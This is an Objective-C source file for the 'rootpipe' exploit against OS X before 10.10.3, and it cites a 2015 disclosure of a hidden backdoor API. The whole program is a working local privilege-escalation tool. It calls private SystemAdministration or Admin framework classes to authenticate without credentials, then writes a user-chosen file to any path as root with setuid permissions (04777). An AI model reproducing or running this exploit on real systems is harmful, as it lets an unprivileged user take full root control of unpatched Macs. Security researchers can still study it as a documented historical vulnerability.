#import <Foundation/Foundation.h>
#import <SecurityFoundation/SFAuthorization.h>

#include <objc/runtime.h>
#include <dlfcn.h>

#define kCFCoreFoundationVersionNumber10_10_3	1153.18

// https://truesecdev.wordpress.com/2015/04/09/hidden-backdoor-api-to-root-privileges-in-apple-os-x/


int main(int argc, const char *argv[])
{
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	
	int retcode = main_ap(argc, argv);
	
	[pool drain];
	
	return retcode;
}


int main_ap(int argc, const char *argv[])
{
	// Is valid usage?
	if (argc != 3)
	{
		fprintf(stderr, "Usage: rootpipe source target\n");
		
		return EXIT_FAILURE;
	}
	
	// Is valid source?
	BOOL isDir;
	
	if (![[NSFileManager defaultManager] fileExistsAtPath:@(argv[1]) isDirectory:&isDir] || isDir)
	{
		fprintf(stderr, "Invalid source.\n");
		
		return EXIT_FAILURE;
	}
	
	// OS X >= 10.10.3
	if (kCFCoreFoundationVersionNumber >= kCFCoreFoundationVersionNumber10_10_3)
	{
		fprintf(stderr, "Exploit fixed.\n");
		
		return EXIT_FAILURE;
	}
	
	
	id tool;
	
	// OS X >= 10.9
	if (floor(kCFCoreFoundationVersionNumber) >= kCFCoreFoundationVersionNumber10_9)
	{
		dlopen("/System/Library/PrivateFrameworks/SystemAdministration.framework/Versions/A/SystemAdministration", RTLD_LAZY | RTLD_GLOBAL);
		
		id client = [objc_lookUpClass("WriteConfigClient") sharedClient];
		
		[client authenticateUsingAuthorizationSync:nil];
		
		tool = [client remoteProxy];
	}
	// OS X < 10.9
	else
	{
		dlopen("/System/Library/PrivateFrameworks/Admin.framework/Versions/A/Admin", RTLD_LAZY | RTLD_GLOBAL);
		
		id authent = [objc_lookUpClass("Authenticator") sharedAuthenticator];
		
		SFAuthorization *authref = [SFAuthorization authorization];
		
		[authent authenticateUsingAuthorizationSync:authref];
		
		id st = [objc_lookUpClass("ToolLiaison") sharedToolLiaison];
		tool = [st tool];
	}
	
	[tool createFileWithContents:[NSData dataWithContentsOfFile:@(argv[1])] path:@(argv[2]) attributes:@{ NSFilePosixPermissions: @04777 }];
	
	
	return EXIT_SUCCESS;
}

